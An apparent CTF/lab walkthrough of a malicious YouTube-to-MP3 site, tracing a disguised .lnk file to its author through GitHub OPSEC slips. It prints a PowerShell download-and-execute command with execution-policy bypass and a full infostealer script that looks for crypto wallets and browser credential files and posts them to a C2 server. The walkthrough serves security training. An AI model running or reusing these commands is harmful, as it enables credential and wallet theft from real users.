# Task 7 - OPSEC - Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?

## Learning Objectives

- Learn how to investigate malicious link files.
- Learn about OPSEC and OPSEC mistakes.
- Understand how to track and attribute digital identities in cyber investigations.

## Investigating the Website

The website we are investigating is a Youtube to MP3 converter currently being shared amongst the organizers of SOC-mas. You've decided to dig deeper after hearing some concerning reports about this website.

From your AttackBox, access the website by visiting **10.10.252.200** using the web browser.


At first glance, the website looks legit and presentable. The About Page even says that it was made by "The Glitch ". How considerate of them to make our job easier!

Scrolling down, you'll see the feature list, which promises to be "Secure" and "Safe." From our experience, that isn't very likely.

## Youtube to MP3 Converter Websites

These websites have been around for a long time. They offer a convenient way to extract audio from YouTube videos, making them popular. However, historically, these websites have been observed to have significant risks, such as:

- **Malvertising**: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.
- **Phishing scams**: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
- **Bundled malware**: Some converters may come with malware, tricking users into unknowingly running it.

What nefarious thing does this website have in store for us?

## Getting Some Tunes

Let's find out by pasting any YouTube link in the search form and pressing the "Convert" button. Then select either `mp3 or mp4` option. This should download a file that we could use to investigate. For example, we can use [https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ), a classic if you ask me.  

Once downloaded, navigate to your Downloads folder or if you are using the AttackBox, to your /root/ directory. Locate the file named `download.zip`, right-click on it, and select **Extract To**. In the dialog window, click the **Extract** button to complete the extraction.

```
file song.mp3 
song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo

file somg.mp3 
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Unicoded, MachineID win-base-2019, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Sat Sep 15 13:14:14 2018, atime=Sat Sep 15 13:14:14 2018, mtime=Sat Sep 15 13:14:14 2018, length=448000, window=normal, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

```

Now, this is more interesting!

The output tells us that instead of an MP3, the file is an "MS Windows shortcut", also known as a `.lnk` file. This file type is used in Windows to link to another file, folder, or application. These shortcuts can also be used to run commands! If you've ever seen the shortcuts on a Windows desktop, you already know what they are.

There are multiple ways to inspect `.lnk`  files to reveal the embedded commands and attributes. For this room, however, we'll use **ExifTool**, which is already installed on this machine.

To do this, go back to your Terminal and type:

```
exiftool somg.mp3 
ExifTool Version Number         : 13.00
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.2 kB
File Modification Date/Time     : 2024:10:30 14:32:52-05:00
File Access Date/Time           : 2024:10:30 14:32:52-05:00
File Inode Change Date/Time     : 2024:12:13 12:32:41-06:00
File Permissions                : -rw-rw-r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 02:14:14-05:00
Access Date                     : 2018:09:15 02:14:14-05:00
Modify Date                     : 2018:09:15 02:14:14-05:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Drive Serial Number             : A8A4-C362
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```

- Llama la atecion
```
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID       
```

What this PowerShell command does:

- The `-ep Bypass -nop` flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
- The `DownloadFile` method pulls a file (in this case, `IS.ps1`) from a remote server ([https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)) and saves it in the `C:\\ProgramData\\` directory on the target machine.
- Once downloaded, the script is executed with PowerShell using the `iex` command, which triggers the downloaded `s.ps1` file.

If you visit the contents of the file to be downloaded using your browser (`https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`), you will see just how lucky we are that we are not currently using Windows.


https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1

```powershell
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server

```

The script is designed to collect highly sensitive information from the victim's system, such as cryptocurrency wallets and saved browser credentials, and send it to an attacker's remote server.

**_Dis__claimer:_** All content in this room, including CPP code, PowerShell scripts, and commands, is provided solely for educational purposes. Please do not execute these on a Windows host.

This looks fairly typical of a PowerShell script for such a purpose, with one notable exception: a signature in the code that reads.

> **Created by the one and only M.M.**

## Searching the Source

There are many paths we could take to continue our investigation. We could investigate the website further, analyse its source code, or search for open directories that might reveal more information about the malicious actor's setup. We can search for the hash or signature on public malware databases like VirusTotal or Any.Run. Each of these methods could yield useful clues.

However, for this room, we'll try something a bit different. Since we already have the PowerShell code, searching for it online might give us useful leads. It's a long shot, but we'll explore it in this exercise.

There are many places where we can search for code. The most widely used is Github. So let's try searching there.

To search effectively, we can look for unique parts of the code that we could use to search with. The more distinctive, the better. For this scenario, we have the string we've uncovered before that reads:

**"Created by the one and only M.M."**

- Buscamos en github y lleamos a:  https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues

https://github.com/ZeruxUAE/IDK/issues/1
https://github.com/ZeruxUAE

https://github.com/Atom1cByte/CryptoWallet-Search/issues/1
https://github.com/Atom1cByte

https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/7
https://github.com/Bloatware-WarevilleTHM


https://github.com/JoshuaFerando/Mayor-Malware




Aha! Looks like this user has made a critical mistake.


## Introduction to OPSEC

This is a classic case of OPSEC failure.

Operational Security (OPSEC) is a term originally coined in the military to refer to the process of protecting sensitive information and operations from adversaries. The goal is to identify and eliminate potential vulnerabilities before the attacker can learn their identity.

In the context of cyber security, when malicious actors fail to follow proper OPSEC practices, they might leave digital traces that can be pieced together to reveal their identity. Some common OPSEC mistakes include:

- Reusing usernames, email addresses, or account handles across multiple platforms. One might assume that anyone trying to cover their tracks would remove such obvious and incriminating information, but sometimes, it's due to vanity or simply forgetfulness.
- Using identifiable metadata in code, documents, or images, which may reveal personal information like device names, GPS coordinates, or timestamps.
- Posting publicly on forums or GitHub (Like in this current scenario) with details that tie back to their real identity or reveal their location or habits.
- Failing to use a VPN or proxy while conducting malicious activities allows law enforcement to track their real IP address.

You'd think that someone doing something bad would make OPSEC their top priority, but they're only human and can make mistakes, too.

For example, here are some real-world OPSEC mistakes that led to some really big fails:

### AlphaBay Admin Takedown

One of the most spectacular OPSEC failures involved Alexandre Cazes, the administrator of AlphaBay, one of the largest dark web marketplaces:

- Cazes used the email address "[pimp_alex_91@hotmail.com](mailto:pimp_alex_91@hotmail.com)" in early welcome emails from the site.
- This email included his year of birth and other identifying information.
- He cashed out using a Bitcoin account tied to his real name.
- Cazes reused the username "Alpha02" across multiple platforms, linking his dark web identity to forum posts under his real name.

### Chinese Military Hacking Group (APT1)

There's also the notorious Chinese hacking group APT1, which made several OPSEC blunders:

- One member, Wang Dong, signed his malware code with the nickname "Ugly Gorilla".
- This nickname was linked to programming forum posts associated with his real name.
- The group used predictable naming conventions for users, code, and passwords.
- Their activity consistently aligned with Beijing business hours, making their location obvious.

These failures provided enough information for cyber security researchers and law enforcement to publicly identify group members.

## Uncovering MM

If you've thoroughly investigated the GitHub search result, you should have uncovered several clues based on poor OPSEC practices by the malicious actor.

We know the attacker left a distinctive signature in the PowerShell code (MM). This allowed us to search for related repositories and issues pages on GitHub. We then discovered an Issues page where the attacker engaged in discussions, providing more context and linking their activity to other projects.

In this discussion, they responded to a query about modifying the code. This response, paired with their unique handle, was another critical slip-up, leaving behind a trail of evidence that can be traced back to them. By analysing the timestamps, usernames, and the nature of their interactions, we can now attribute the mastermind behind the attack to MM.